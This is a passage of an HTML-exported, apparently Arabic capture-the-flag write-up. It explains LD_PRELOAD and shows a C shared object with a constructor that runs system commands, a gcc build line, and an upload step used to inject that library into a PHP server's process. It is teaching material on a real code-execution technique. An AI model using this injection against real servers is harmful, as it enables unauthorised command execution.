+font-family:"Calibri",sans-serif;color:black'>PATH </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> ، لكن للأسف جميع المحاولات لم تُجدي ، لذلك
+بدأت بالبحث عن متغيرات أخرى من الممكن استغلالها، وفي هذه المرحلة العملية كانت
+عن محاولات عدة لحقن المتغير ومراقبة ما يحدث بعد ذلك ، المتغيرات التي قمت
+بإختبارها لم تجدي حتى وصلت للمتغير </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal align=right style='text-align:right;line-height:115%'><b><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;background:yellow'>HINT #2</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>أقرأ عن المتغير: </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>LD_PREALOAD</span></b></p>
+
+<p class=MsoNormal align=center dir=RTL style='text-align:center;line-height:
+115%;direction:rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:black'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>ماهو المتغير </span><b><span lang=EN-GB dir=LTR
+style='font-size:14.0pt;line-height:115%;color:black'>LD_PREALOAD</span></b><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'><span dir=RTL></span> بإختصار؟</span></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:"Courier New";
+color:black'>o<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>خلال مرحلة الـ </span><b><span lang=EN-GB
+dir=LTR style='font-size:14.0pt;line-height:115%;color:black'>Linking</span></b><span
+lang=EN-GB dir=LTR style='font-size:14.0pt;line-height:115%;color:black'> </span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'><span dir=RTL></span> لإنتاج البرنامج ، </span></p>
+
+<p class=MsoNormal dir=RTL style='margin-right:36.0pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>الـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>Linux Dynamic Linker</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> يبحث في مسارات معينة عن الـ </span><b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Library</span></b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'> <b>Functions</b>
+</span><span dir=RTL></span><b><span style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> </span></b><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>التي يستخدمها البرنامج ، </span></p>
+
+<p class=MsoNormal dir=RTL style='margin-right:36.0pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>المستخدم يستطيع إضافة مسارات أخرى يبحث فيها الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Linker</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> ، كيف ؟ عن طريق هذا المتغير.  </span></p>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><code><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span></code><span
+dir=RTL></span><code><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>اطلع على هذا المرجع لفهمه أكثر: </span></code></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=EN-GB
+style='font-size:14.0pt;line-height:115%'><a
+href="http://man7.org/linux/man-pages/man8/ld.so.8.html"><span dir=LTR>http://man7.org/linux/man-pages/man8/ld.so.8.html</span></a><span
+dir=RTL></span><span style='color:black'><span dir=RTL></span> </span></span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد فهم طبيعة عمل المتغير
+السابق، نستطيع القول بأننا سنبدأ العمل الآن على: </span><em><b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;font-style:normal'>Injecting</span></b></em><span class=st><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> a </span></b></span><em><b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black;font-style:normal'>Shared
+Library</span></b></em></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=RTL></span><b><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> </span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>وقبل البدء لنقوم بتلخيص
+الخطوات والأمور التي سنحتاجها لتنفيذ هذه الخطوات </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>١ - سنقوم بإنشاء </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Shared Object </span></b><span dir=RTL></span><b><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> </span></b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>خاص بنا ونضع به التعليمات التي نريد تنفيذ عندما يتم تحميل الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Shared  Object </span></b><span dir=RTL></span><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> وقت تنفيذ البرنامج</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>٢ - سنحتاج لوسيلة تتيح لنا
+رفع هذا الـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>Shared Object</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> على الـ </span><b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>Server</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> ومن ثم الحصول على المسار الخاص به </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>٣ - سنحتاج أن نكتب قيمة
+المسار السابق في المتغير </span><b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>LD_PRELOAD</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span>، ،ومن ثم سنحتاج أن يتم تنفيذ البرنامج لكي يتم تحميل الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Shared</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> <b>Object</b> </span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> الذي قمنا
+برفعه </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> لنبدأ الآن في كل خطوة على
+حدى ، </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black;background:yellow'>١ - إنشاء
+الـ </span></b><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black;background:yellow'>Shared Object </span></b><span
+dir=RTL></span><b><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black;background:yellow'><span dir=RTL></span>:</span></b><b><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>قمت في البداية بكتابة هذا
+الكود البسيط بـ </span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>C </span><span dir=RTL></span><span
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> </span></p>
+
+<div align=right>
+
+<table class=MsoTableGrid dir=rtl border=1 cellspacing=0 cellpadding=0
+ style='margin-left:521.65pt;border-collapse:collapse;border:none'>
+ <tr>
+  <td width=586 valign=top style='width:439.5pt;border:solid windowtext 1.0pt;
+  padding:0cm 5.4pt 0cm 5.4pt'>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  dir=LTR></span><span style='font-size:14.0pt;line-height:115%;font-family:
+  "Calibri",sans-serif;color:black'><span dir=LTR></span>#include
+  &lt;stdio.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>#include &lt;string.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>#include &lt;stdlib.h&gt;</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>void __attribute__((constructor)) command();</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>void command (void) {</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>system(&quot;ls&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>system(&quot;pwd&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:black'>system(&quot;whoami&quot;);</span></p>
+  <p class=MsoNormal dir=LTR style='text-align:justify;line-height:115%'><span
+  dir=RTL></span><span lang=AR-SA dir=RTL style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span>{</span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:#C00000'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><b><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:#C00000'>ملحوظة مهمة جدًا وخطأ وقعت به:</span></b><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;color:#C00000'> </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:"Courier New";
+color:black'>o<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>ملفات الـ </span><span dir=LTR></span><span
+lang=EN-GB dir=LTR style='font-size:14.0pt;line-height:115%;color:black'><span
+dir=LTR></span>.so </span><span dir=RTL></span><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;color:black'><span dir=RTL></span> لا
+تحتوي على الـ </span><span lang=EN-GB dir=LTR style='font-size:14.0pt;
+line-height:115%;color:black'>main function </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;color:black'><span dir=RTL></span> (
+وهذا شيئ منطقي لأن البرنامج بنفسه يحتوى عليها</span><span dir=LTR></span><span
+lang=EN-GB dir=LTR style='font-size:14.0pt;line-height:115%;color:black'><span
+dir=LTR></span>( </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;color:black'><span dir=RTL></span> ، </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;color:black'>فكيف نحل هذه المشكلة ؟ عن
+طريق الـ </span><span lang=EN-GB dir=LTR style='font-size:14.0pt;line-height:
+115%;color:black'>Constructor </span><span dir=RTL></span><span lang=EN-GB
+style='font-size:14.0pt;line-height:115%;color:black'><span dir=RTL></span> </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;color:black'>هنا تجد مرجع ممتاز: </span></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+line-height:115%;direction:rtl;unicode-bidi:embed'><span lang=EN-GB
+style='font-size:14.0pt;line-height:115%'><a
+href="https://www.geeksforgeeks.org/__attribute__constructor-__attribute__destructor-syntaxes-c/"><span
+dir=LTR>https://www.geeksforgeeks.org/__attribute__constructor-__attribute__destructor-syntaxes-c</span><span
+dir=RTL></span><span lang=AR-SA><span dir=RTL></span>/</span></a><span
+style='color:black'> </span></span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد كتابة كود الـ </span><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>C </span><span dir=RTL></span><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> <span
+lang=AR-SA>، نحتاج أن ننشئ ملف الـ </span></span><span dir=LTR></span><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=LTR></span>.so </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> ، هذه التعليمة تؤدي الغرض:</span></p>
+
+<p class=MsoNormal style='line-height:115%'><b><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>gcc -fPIC
+-shared -o OutputFile.so fileName.c -nostartfiles</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=RTL></span><b><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;background:yellow'><span dir=RTL></span>٢ - رفع ملف الـ </span></b><span
+dir=LTR></span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black;background:yellow'><span dir=LTR></span>.so
+</span></b><span dir=RTL></span><b><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black;background:yellow'><span
+dir=RTL></span> على الـ </span></b><b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black;background:yellow'>Server</span></b><span
+dir=RTL></span><b><span style='font-size:14.0pt;line-height:115%;font-family:
+"Calibri",sans-serif;color:black'><span dir=RTL></span> </span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد العودة للكود المصدري
+الخاص بالـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>PHP</span></b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> نجد أنه بإمكاننا الرفع عن طريق إرسال الأمر </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Download</span></b><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'> </span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'><span dir=RTL></span> متبوعًا بـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>URL</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> خاص بالملف الذي نريد رفعه علي الـ </span><b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>Server</span></b><span dir=LTR style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'> </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> ، ثم اسم الملف ، أي كالآتي : </span></p>
+
+<p class=MsoNormal style='line-height:115%'><b><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'>Download FileURL
+FileName</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>نقوم بعملية الرفع </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><img width=555 height=148
+src="admin-diagnostics-WRITEUP.fld/image003.png" align=right hspace=12></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span style='position:relative;z-index:251661312'><span
+style='left:0px;position:absolute;left:440px;top:-1306px;width:553px;
+height:96px'>
+
+<table cellpadding=0 cellspacing=0 align=left>
+ <tr>
+  <td width=0 height=0></td>
+  <td width=292></td>
+  <td width=23></td>
+  <td width=238></td>
+ </tr>
+ <tr>
+  <td height=22></td>
+  <td align=left valign=top><img width=292 height=22
+  src="admin-diagnostics-WRITEUP.fld/image004.png"></td>
+ </tr>
+ <tr>
+  <td height=52></td>
+ </tr>
+ <tr>
+  <td height=22></td>
+  <td colspan=2></td>
+  <td align=left valign=top><img width=238 height=22
+  src="admin-diagnostics-WRITEUP.fld/image005.png"></td>
+ </tr>
+</table>
+
+</span></span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
